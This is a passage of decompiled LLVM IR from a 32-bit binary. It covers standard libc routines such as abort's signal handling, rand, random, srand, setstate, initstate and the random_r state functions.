  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ceff

dec_label_pc_804ceff:                             ; preds = %dec_label_pc_804ceff.dec_label_pc_804ceff_crit_edge, %dec_label_pc_804ced4
  %v0_804ceff = phi i32 [ %v12_804ce5a, %dec_label_pc_804ced4 ], [ %v0_804ceff.pre, %dec_label_pc_804ceff.dec_label_pc_804ceff_crit_edge ]
  %v1_804cf0718 = phi i32 [ 31, %dec_label_pc_804ced4 ], [ %v1_804cf07, %dec_label_pc_804ceff.dec_label_pc_804ceff_crit_edge ]
  %v2_804ceff = mul i32 %v1_804cf0718, 4
  %v3_804ceff = add i32 %v2_804ceff, 16
  %v4_804ceff = add i32 %v3_804ceff, %v0_804ceff
  %v5_804ceff = inttoptr i32 %v4_804ceff to i32*
  store i32 -1, i32* %v5_804ceff, align 4
  %v0_804cf07.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804cf07 = add i32 %v0_804cf07.pre, -1
  %v9_804cf07 = icmp slt i32 %v1_804cf07, 0
  store i32 %v1_804cf07, i32* %eax.global-to-local, align 4
  %v1_804cf08 = icmp eq i1 %v9_804cf07, false
  br i1 %v1_804cf08, label %dec_label_pc_804ceff.dec_label_pc_804ceff_crit_edge, label %dec_label_pc_804cf0a

dec_label_pc_804ceff.dec_label_pc_804ceff_crit_edge: ; preds = %dec_label_pc_804ceff
  %v0_804ceff.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ceff

dec_label_pc_804cf0a:                             ; preds = %dec_label_pc_804ceff
  store i32 %v2_804cedc, i32* %eax.global-to-local, align 4
  %v4_804cf1f = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804cf1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cea3

dec_label_pc_804cf2c:                             ; preds = %dec_label_pc_804cecb
  %v10_804cf2c = icmp eq i8 %v0_804cecb, 2
  %v1_804cf2e = icmp eq i1 %v10_804cf2c, false
  br i1 %v1_804cf2e, label %dec_label_pc_804cf38, label %dec_label_pc_804cf30

dec_label_pc_804cf30:                             ; preds = %dec_label_pc_804cf2c
  store i8 3, i8* @global_var_8055dc0.363, align 64
  br label %dec_label_pc_804cf38

dec_label_pc_804cf38:                             ; preds = %dec_label_pc_804cf2c, %dec_label_pc_804cf30
  %v0_804cf38 = phi i8 [ %v0_804cecb, %dec_label_pc_804cf2c ], [ 3, %dec_label_pc_804cf30 ]
  %v9_804cf38 = icmp eq i8 %v0_804cf38, 3
  %v1_804cf3f = icmp eq i1 %v9_804cf38, false
  br i1 %v1_804cf3f, label %dec_label_pc_804cf52, label %dec_label_pc_804cf41

dec_label_pc_804cf41:                             ; preds = %dec_label_pc_804cf38
  store i8 4, i8* @global_var_8055dc0.363, align 64
  %v1_804cf4d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804cf52:                             ; preds = %dec_label_pc_804cf38, %dec_label_pc_804cf52
  br label %dec_label_pc_804cf52

; uselistorder directives
  uselistorder i32 %v1_804cf07, { 2, 1, 0 }
  uselistorder i8 %v0_804cecb, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ce6a, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8* @global_var_8055dc0.363, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804cf52, { 1, 0 }
  uselistorder label %dec_label_pc_804cf38, { 1, 0 }
  uselistorder label %dec_label_pc_804cecb, { 1, 0 }
  uselistorder label %dec_label_pc_804ce93, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_804cf58 = call i32 @random()
  ret i32 %v0_804cf58

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 0, 3, 2, 5, 4, 1 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf60 = load i32, i32* @ebx, align 4
  store i32 %v0_804cf60, i32* %stack_var_-4, align 4
  %v2_804cf6e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cf6e, i32* @ebx, align 4
  %v2_804cf73 = call i32 @__pthread_return_void(i32 %v2_804cf6e, i32 134535499)
  %v1_804cf7f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053640.364 to i32))
  %v2_804cf86 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cf90 = call i32 @__GI_random_r(i32* nonnull @global_var_8053658, i32 %v2_804cf86)
  store i32 ptrtoint (i32* @global_var_8053658 to i32), i32* @eax, align 4
  store i32 %v2_804cf86, i32* @edx, align 4
  %v2_804cf9a = call i32 @__pthread_return_void(i32 %v2_804cf6e, i32 1)
  %v3_804cf9f = load i32, i32* %stack_var_-8, align 4
  %v2_804cfa6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cfa6, i32* @ebx, align 4
  ret i32 %v3_804cf9f
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804cfb9 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cfb9, i32* @eax, align 4
  %v2_804cfbe = call i32 @__pthread_return_void(i32 %v2_804cfb9, i32 134535499)
  %v1_804cfca = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053640.364 to i32))
  %v0_804cfcf = load i32, i32* bitcast (i32** @global_var_8053660.367 to i32*), align 32
  store i32 %v0_804cfcf, i32* @ebx, align 4
  %v3_804cfe0 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8053658)
  %v2_804cfe8 = icmp slt i32 %v3_804cfe0, 0
  br i1 %v2_804cfe8, label %dec_label_pc_804cfef, label %dec_label_pc_804cfec

dec_label_pc_804cfec:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805365c.368 to i32), i32* @esi, align 4
  br label %dec_label_pc_804cfef

dec_label_pc_804cfef:                             ; preds = %entry, %dec_label_pc_804cfec
  store i32 %v2_804cfb9, i32* @eax, align 4
  %v2_804cff8 = call i32 @__pthread_return_void(i32 %v2_804cfb9, i32 1)
  %v0_804d000 = load i32, i32* @esi, align 4
  ret i32 %v0_804d000

; uselistorder directives
  uselistorder label %dec_label_pc_804cfef, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_804d014 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d014, i32* @ebx, align 4
  %v2_804d019 = call i32 @__pthread_return_void(i32 %v2_804d014, i32 134535499)
  %v1_804d025 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053640.364 to i32))
  store i32 ptrtoint (i32** @global_var_805365c.368 to i32), i32* @esi, align 4
  %v4_804d044 = inttoptr i32 %arg2 to i32*
  %v5_804d044 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804d044, i32 %arg3, i32 ptrtoint (i32* @global_var_8053658 to i32))
  store i32 %v5_804d044, i32* @eax, align 4
  %v2_804d04f = call i32 @__pthread_return_void(i32 %v2_804d014, i32 1)
  %v0_804d057 = load i32, i32* @esi, align 4
  ret i32 %v0_804d057
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d05c = load i32, i32* @ebx, align 4
  store i32 %v0_804d05c, i32* %stack_var_-4, align 4
  %v2_804d06a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d06a, i32* @ebx, align 4
  %v2_804d06f = call i32 @__pthread_return_void(i32 %v2_804d06a, i32 134535499)
  %v1_804d07b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053640.364 to i32))
  %v3_804d08b = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8053658)
  store i32 ptrtoint (i32* @global_var_8053658 to i32), i32* @eax, align 4
  %v2_804d095 = call i32 @__pthread_return_void(i32 %v2_804d06a, i32 1)
  %v2_804d09d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d09d, i32* @ebx, align 4
  ret i32 %v2_804d095

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8053658 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8053658, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_804d0a3 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_804d0af = add i32 %tmp3, 12
  %v2_804d0af = inttoptr i32 %v1_804d0af to i32*
  %v3_804d0af = load i32, i32* %v2_804d0af, align 4
  store i32 %v3_804d0af, i32* %ecx.global-to-local, align 4
  %v1_804d0b2 = add i32 %arg1, 4
  store i32 %v1_804d0b2, i32* %esi.global-to-local, align 4
  %v1_804d0b5 = add i32 %tmp3, 8
  %v2_804d0b5 = inttoptr i32 %v1_804d0b5 to i32*
  %v3_804d0b5 = load i32, i32* %v2_804d0b5, align 4
  %v1_804d0b8 = icmp eq i32 %v3_804d0af, 0
  %v1_804d0ba = icmp eq i1 %v1_804d0b8, false
  br i1 %v1_804d0ba, label %dec_label_pc_804d0c5, label %dec_label_pc_804d0bc

dec_label_pc_804d0bc:                             ; preds = %entry
  %v1_804d0bc = add i32 %v3_804d0b5, -4
  %v2_804d0bc = inttoptr i32 %v1_804d0bc to i32*
  store i32 0, i32* %v2_804d0bc, align 4
  br label %dec_label_pc_804d0d5

dec_label_pc_804d0c5:                             ; preds = %entry
  %v1_804d0c5 = add i32 %tmp3, 4
  %v2_804d0c5 = inttoptr i32 %v1_804d0c5 to i32*
  %v3_804d0c5 = load i32, i32* %v2_804d0c5, align 4
  %v2_804d0c8 = sub i32 %v3_804d0c5, %v3_804d0b5
  %v2_804d0ca = sdiv i32 %v2_804d0c8, 4
  %v3_804d0cd = mul i32 %v2_804d0ca, 5
  %v2_804d0d0 = add i32 %v3_804d0cd, %v3_804d0af
  store i32 %v2_804d0d0, i32* %eax.global-to-local, align 4
  %v2_804d0d2 = add i32 %v3_804d0b5, -4
  %v3_804d0d2 = inttoptr i32 %v2_804d0d2 to i32*
  store i32 %v2_804d0d0, i32* %v3_804d0d2, align 4
  br label %dec_label_pc_804d0d5

dec_label_pc_804d0d5:                             ; preds = %dec_label_pc_804d0bc, %dec_label_pc_804d0c5
  %v0_804d0d5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d0d5 = add i32 %v0_804d0d5, -4
  %v2_804d0d5 = inttoptr i32 %v1_804d0d5 to i32*
  %v3_804d0d5 = load i32, i32* %v2_804d0d5, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804d0dd = ashr i32 %v3_804d0d5, 31
  %v2_804d0de = zext i32 %v3_804d0d5 to i64
  %v4_804d0de = zext i32 %v1_804d0dd to i64
  %v5_804d0de = mul nuw i64 %v4_804d0de, 4294967296
  %v6_804d0de = or i64 %v5_804d0de, %v2_804d0de
  %v8_804d0de = sdiv i64 %v6_804d0de, 5
  %v9_804d0de = trunc i64 %v8_804d0de to i32
  store i32 %v9_804d0de, i32* %eax.global-to-local, align 4
  %v10_804d0de = srem i64 %v6_804d0de, 5
  %v11_804d0de = trunc i64 %v10_804d0de to i32
  %v6_804d0e3 = icmp ugt i32 %v11_804d0de, 4
  br i1 %v6_804d0e3, label %dec_label_pc_804d123, label %dec_label_pc_804d0e5

dec_label_pc_804d0e5:                             ; preds = %dec_label_pc_804d0d5
  %v1_804d0e5 = mul i32 %v11_804d0de, 4
  %v2_804d0e5 = add i32 %v1_804d0e5, ptrtoint (i32* @global_var_8052414.369 to i32)
  %v3_804d0e5 = inttoptr i32 %v2_804d0e5 to i32*
  %v4_804d0e5 = load i32, i32* %v3_804d0e5, align 4
  store i32 %v4_804d0e5, i32* %ecx.global-to-local, align 4
  %v1_804d0ec = icmp eq i32 %v11_804d0de, 0
  %v2_804d0ee = add i32 %v1_804d0e5, ptrtoint (i32* @global_var_8052400.370 to i32)
  %v3_804d0ee = inttoptr i32 %v2_804d0ee to i32*
  %v4_804d0ee = load i32, i32* %v3_804d0ee, align 4
  store i32 %v4_804d0ee, i32* %ebp.global-to-local, align 4
  %v1_804d0f5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d0f5 = add i32 %v1_804d0f5, 12
  %v3_804d0f5 = inttoptr i32 %v2_804d0f5 to i32*
  store i32 %v11_804d0de, i32* %v3_804d0f5, align 4
  %v0_804d0f8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d0f8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d0f8 = add i32 %v1_804d0f8, 16
  %v3_804d0f8 = inttoptr i32 %v2_804d0f8 to i32*
  store i32 %v0_804d0f8, i32* %v3_804d0f8, align 4
  %v0_804d0fb = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d0fb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d0fb = add i32 %v1_804d0fb, 20
  %v3_804d0fb = inttoptr i32 %v2_804d0fb to i32*
  store i32 %v0_804d0fb, i32* %v3_804d0fb, align 4
  br i1 %v1_804d0ec, label %dec_label_pc_804d116, label %dec_label_pc_804d100

dec_label_pc_804d100:                             ; preds = %dec_label_pc_804d0e5
  %v0_804d100 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d100 = add i32 %v0_804d100, -4
  %v2_804d100 = inttoptr i32 %v1_804d100 to i32*
  %v3_804d100 = load i32, i32* %v2_804d100, align 4
  %v1_804d103 = ashr i32 %v3_804d100, 31
  %v0_804d104 = load i32, i32* %edi.global-to-local, align 4
  %v2_804d104 = zext i32 %v3_804d100 to i64
  %v4_804d104 = zext i32 %v1_804d103 to i64
  %v5_804d104 = mul nuw i64 %v4_804d104, 4294967296
  %v6_804d104 = or i64 %v5_804d104, %v2_804d104
  %v7_804d104 = zext i32 %v0_804d104 to i64
  %v8_804d104 = sdiv i64 %v6_804d104, %v7_804d104
  %v9_804d104 = trunc i64 %v8_804d104 to i32
  %v2_804d106 = mul i32 %v9_804d104, 4
  %v3_804d106 = add i32 %v2_804d106, %v0_804d100
  %v1_804d109 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804d109 = add i32 %v1_804d109, %v9_804d104
  store i32 %v2_804d109, i32* %eax.global-to-local, align 4
  %v1_804d10b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d10b = add i32 %v1_804d10b, 4
  %v3_804d10b = inttoptr i32 %v2_804d10b to i32*
  store i32 %v3_804d106, i32* %v3_804d10b, align 4
  %v0_804d10e = load i32, i32* %eax.global-to-local, align 4
  %v1_804d10e = ashr i32 %v0_804d10e, 31
  %v0_804d10f = load i32, i32* %ecx.global-to-local, align 4
  %v2_804d10f = zext i32 %v0_804d10e to i64
  %v4_804d10f = zext i32 %v1_804d10e to i64
  %v5_804d10f = mul nuw i64 %v4_804d10f, 4294967296
  %v6_804d10f = or i64 %v5_804d10f, %v2_804d10f
  %v7_804d10f = zext i32 %v0_804d10f to i64
  %v8_804d10f = sdiv i64 %v6_804d10f, %v7_804d10f
  %v9_804d10f = trunc i64 %v8_804d10f to i32
  store i32 %v9_804d10f, i32* %eax.global-to-local, align 4
  %v10_804d10f = srem i64 %v6_804d10f, %v7_804d10f
  %v11_804d10f = trunc i64 %v10_804d10f to i32
  %v0_804d111 = load i32, i32* %esi.global-to-local, align 4
  %v2_804d111 = mul i32 %v11_804d10f, 4
  %v3_804d111 = add i32 %v2_804d111, %v0_804d111
  %v1_804d114 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d114 = inttoptr i32 %v1_804d114 to i32*
  store i32 %v3_804d111, i32* %v2_804d114, align 4
  br label %dec_label_pc_804d116

dec_label_pc_804d116:                             ; preds = %dec_label_pc_804d0e5, %dec_label_pc_804d100
  %v0_804d116 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d116 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804d116 = mul i32 %v1_804d116, 4
  %v3_804d116 = add i32 %v2_804d116, %v0_804d116
  %v1_804d119 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d119 = add i32 %v1_804d119, 24
  %v3_804d119 = inttoptr i32 %v2_804d119 to i32*
  store i32 %v3_804d116, i32* %v3_804d119, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d11e = load i32, i32* %esi.global-to-local, align 4
  %v1_804d11e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d11e = add i32 %v1_804d11e, 8
  %v3_804d11e = inttoptr i32 %v2_804d11e to i32*
  store i32 %v0_804d11e, i32* %v3_804d11e, align 4
  %v0_804d138.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d131

dec_label_pc_804d123:                             ; preds = %dec_label_pc_804d0d5
  %v1_804d123 = call i32 @__errno_location(i32 %v0_804d0a3)
  %v1_804d128 = inttoptr i32 %v1_804d123 to i32*
  store i32 22, i32* %v1_804d128, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d131

dec_label_pc_804d131:                             ; preds = %dec_label_pc_804d116, %dec_label_pc_804d123
  %v0_804d138 = phi i32 [ %v0_804d138.pre, %dec_label_pc_804d116 ], [ -1, %dec_label_pc_804d123 ]
  store i32 %v0_804d0a3, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d138

; uselistorder directives
  uselistorder i32 %v11_804d0de, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d131, { 1, 0 }
  uselistorder label %dec_label_pc_804d116, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d5, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804d13c = load i32, i32* @ebx, align 4
  store i32 %v0_804d13c, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804d145 = add i32 %tmp3, 12
  %v2_804d145 = inttoptr i32 %v1_804d145 to i32*
  %v3_804d145 = load i32, i32* %v2_804d145, align 4
  %v4_804d145 = icmp eq i32 %v3_804d145, 0
  %v1_804d149 = add i32 %tmp3, 8
  %v2_804d149 = inttoptr i32 %v1_804d149 to i32*
  %v3_804d149 = load i32, i32* %v2_804d149, align 4
  store i32 %v3_804d149, i32* %esi.global-to-local, align 4
  %v1_804d14c = icmp eq i1 %v4_804d145, false
  br i1 %v1_804d14c, label %dec_label_pc_804d165, label %dec_label_pc_804d14e

dec_label_pc_804d14e:                             ; preds = %entry
  %v2_804d14e = inttoptr i32 %v3_804d149 to i32*
  %v3_804d14e = load i32, i32* %v2_804d14e, align 4
  %v5_804d14e = mul i32 %v3_804d14e, 1103515245
  %v1_804d154 = add i32 %v5_804d14e, 12345
  %v1_804d159 = urem i32 %v1_804d154, -2147483648
  store i32 %v1_804d159, i32* %eax.global-to-local, align 4
  store i32 %v1_804d159, i32* %v2_804d14e, align 4
  %v0_804d160 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d160 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804d160 = inttoptr i32 %v1_804d160 to i32*
  store i32 %v0_804d160, i32* %v2_804d160, align 4
  br label %dec_label_pc_804d190

dec_label_pc_804d165:                             ; preds = %entry
  %v1_804d165 = add i32 %tmp3, 4
  %v2_804d165 = inttoptr i32 %v1_804d165 to i32*
  %v3_804d165 = load i32, i32* %v2_804d165, align 4
  store i32 %v3_804d165, i32* %ecx.global-to-local, align 4
  %v2_804d168 = load i32, i32* %arg1, align 4
  store i32 %v2_804d168, i32* %edx.global-to-local, align 4
  %v1_804d16a = add i32 %tmp3, 24
  %v2_804d16a = inttoptr i32 %v1_804d16a to i32*
  %v3_804d16a = load i32, i32* %v2_804d16a, align 4
  store i32 %v3_804d16a, i32* %edi.global-to-local, align 4
  %v1_804d16d = inttoptr i32 %v3_804d165 to i32*
  %v2_804d16d = load i32, i32* %v1_804d16d, align 4
  store i32 %v2_804d16d, i32* %eax.global-to-local, align 4
  %v1_804d16f = inttoptr i32 %v2_804d168 to i32*
  %v2_804d16f = load i32, i32* %v1_804d16f, align 4
  %v4_804d16f = add i32 %v2_804d16f, %v2_804d16d
  store i32 %v4_804d16f, i32* %v1_804d16f, align 4
  %v0_804d171 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d171 = inttoptr i32 %v0_804d171 to i32*
  %v2_804d171 = load i32, i32* %v1_804d171, align 4
  %v1_804d173 = add i32 %v0_804d171, 4
  store i32 %v1_804d173, i32* %edx.global-to-local, align 4
  %v2_804d176 = udiv i32 %v2_804d171, 2
  %v1_804d178 = load i32, i32* %edi.global-to-local, align 4
  %v7_804d178 = icmp ult i32 %v1_804d173, %v1_804d178
  %v1_804d17a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804d17a = inttoptr i32 %v1_804d17a to i32*
  store i32 %v2_804d176, i32* %v2_804d17a, align 4
  %v0_804d17d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d17d = add i32 %v0_804d17d, 4
  store i32 %v1_804d17d, i32* %eax.global-to-local, align 4
  br i1 %v7_804d178, label %dec_label_pc_804d186, label %dec_label_pc_804d182

dec_label_pc_804d182:                             ; preds = %dec_label_pc_804d165
  %v0_804d182 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804d182, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d18b

dec_label_pc_804d186:                             ; preds = %dec_label_pc_804d165
  %v1_804d186 = load i32, i32* %edi.global-to-local, align 4
  %v7_804d186 = icmp ult i32 %v1_804d17d, %v1_804d186
  %v1_804d188 = icmp eq i1 %v7_804d186, false
  %v3_804d188 = load i32, i32* %esi.global-to-local, align 4
  %v4_804d188 = select i1 %v1_804d188, i32 %v3_804d188, i32 %v1_804d17d
  store i32 %v4_804d188, i32* %eax.global-to-local, align 4
  %v0_804d18b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d18b

dec_label_pc_804d18b:                             ; preds = %dec_label_pc_804d182, %dec_label_pc_804d186
  %v0_804d18b = phi i32 [ %v0_804d182, %dec_label_pc_804d182 ], [ %v0_804d18b.pre, %dec_label_pc_804d186 ]
  %v1_804d18b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d18b = inttoptr i32 %v1_804d18b to i32*
  store i32 %v0_804d18b, i32* %v2_804d18b, align 4
  %v0_804d18d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d18d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d18d = add i32 %v1_804d18d, 4
  %v3_804d18d = inttoptr i32 %v2_804d18d to i32*
  store i32 %v0_804d18d, i32* %v3_804d18d, align 4
  br label %dec_label_pc_804d190

dec_label_pc_804d190:                             ; preds = %dec_label_pc_804d14e, %dec_label_pc_804d18b
  %v2_804d190 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d190, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804d159, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804d190, { 1, 0 }
  uselistorder label %dec_label_pc_804d18b, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804d197 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d19b = load i32, i32* @edi, align 4
  %v0_804d19c = load i32, i32* @esi, align 4
  %v0_804d19d = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804d1a9 = add i32 %tmp14, 12
  %v2_804d1a9 = inttoptr i32 %v1_804d1a9 to i32*
  %v3_804d1a9 = load i32, i32* %v2_804d1a9, align 4
  store i32 %v3_804d1a9, i32* %ecx.global-to-local, align 4
  %v6_804d1af = icmp ugt i32 %v3_804d1a9, 4
  br i1 %v6_804d1af, label %dec_label_pc_804d229, label %dec_label_pc_804d1b1

dec_label_pc_804d1b1:                             ; preds = %entry
  %v1_804d1b1 = add i32 %tmp14, 8
  %v2_804d1b1 = inttoptr i32 %v1_804d1b1 to i32*
  %v3_804d1b1 = load i32, i32* %v2_804d1b1, align 4
  store i32 %v3_804d1b1, i32* %ebx.global-to-local, align 4
  %v1_804d1b4 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_804d1bb = select i1 %v1_804d1b4, i32 1, i32 %arg1
  store i32 %v3_804d1bb, i32* %edx.global-to-local, align 4
  %v1_804d1be = icmp eq i32 %v3_804d1a9, 0
  %v2_804d1c0 = inttoptr i32 %v3_804d1b1 to i32*
  store i32 %v3_804d1bb, i32* %v2_804d1c0, align 4
  br i1 %v1_804d1be, label %dec_label_pc_804d227, label %dec_label_pc_804d1c4

dec_label_pc_804d1c4:                             ; preds = %dec_label_pc_804d1b1
  %v0_804d1c4 = load i32, i32* @esi, align 4
  %v1_804d1c4 = add i32 %v0_804d1c4, 16
  %v2_804d1c4 = inttoptr i32 %v1_804d1c4 to i32*
  %v3_804d1c4 = load i32, i32* %v2_804d1c4, align 4
  store i32 %v3_804d1c4, i32* %eax.global-to-local, align 4
  %v0_804d1c7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804d1c7, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_804d1ce = sext i32 %v3_804d1c4 to i64
  store i64 %v4_804d1ce, i64* %stack_var_-40, align 8
  %v5_804d20432 = icmp sgt i32 %v3_804d1c4, 1
  br i1 %v5_804d20432, label %dec_label_pc_804d1d3, label %dec_label_pc_804d206

dec_label_pc_804d1d3:                             ; preds = %dec_label_pc_804d1c4, %dec_label_pc_804d1d3.dec_label_pc_804d1d3_crit_edge
  %v0_804d1fb = phi i32 [ %v0_804d1fb.pre, %dec_label_pc_804d1d3.dec_label_pc_804d1d3_crit_edge ], [ %v0_804d1c7, %dec_label_pc_804d1c4 ]
  %v0_804d1d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d1da = ashr i32 %v0_804d1d3, 31
  %v2_804d1db = zext i32 %v0_804d1d3 to i64
  %v4_804d1db = zext i32 %v1_804d1da to i64
  %v5_804d1db = mul nuw i64 %v4_804d1db, 4294967296
  %v6_804d1db = or i64 %v5_804d1db, %v2_804d1db
  %v8_804d1db = sdiv i64 %v6_804d1db, 127773
  %v9_804d1db = trunc i64 %v8_804d1db to i32
  %v10_804d1db = srem i64 %v6_804d1db, 127773
  %v3_804d1e1 = mul nsw i64 %v10_804d1db, 16807
  %v4_804d1e1 = trunc i64 %v3_804d1e1 to i32
  %tmp24 = mul i32 %v9_804d1db, -2836
  %v2_804d1ed = add i32 %v4_804d1e1, %tmp24
  %v1_804d1ef = add i32 %v2_804d1ed, 1
  %v6_804d1ef = xor i32 %v2_804d1ed, -2147483648
  %v7_804d1ef = xor i32 %v1_804d1ef, %v2_804d1ed
  %v8_804d1ef = and i32 %v7_804d1ef, %v6_804d1ef
  %v9_804d1ef = icmp slt i32 %v8_804d1ef, 0
  %v10_804d1ef = icmp eq i32 %v1_804d1ef, 0
  %v11_804d1ef = icmp slt i32 %v1_804d1ef, 0
  %v1_804d1f2 = add i32 %v2_804d1ed, 2147483647
  store i32 %v1_804d1f2, i32* %eax.global-to-local, align 4
  %v3_804d1f8 = icmp ne i1 %v11_804d1ef, %v9_804d1ef
  %v4_804d1f8 = or i1 %v10_804d1ef, %v3_804d1f8
  %v7_804d1f8 = select i1 %v4_804d1f8, i32 %v1_804d1f2, i32 %v2_804d1ed
  store i32 %v7_804d1f8, i32* %edx.global-to-local, align 4
  %v1_804d1fb = add i32 %v0_804d1fb, 4
  store i32 %v1_804d1fb, i32* %ecx.global-to-local, align 4
  %v2_804d1fe = inttoptr i32 %v1_804d1fb to i32*
  store i32 %v7_804d1f8, i32* %v2_804d1fe, align 4
  %v0_804d200 = load i32, i32* @edi, align 4
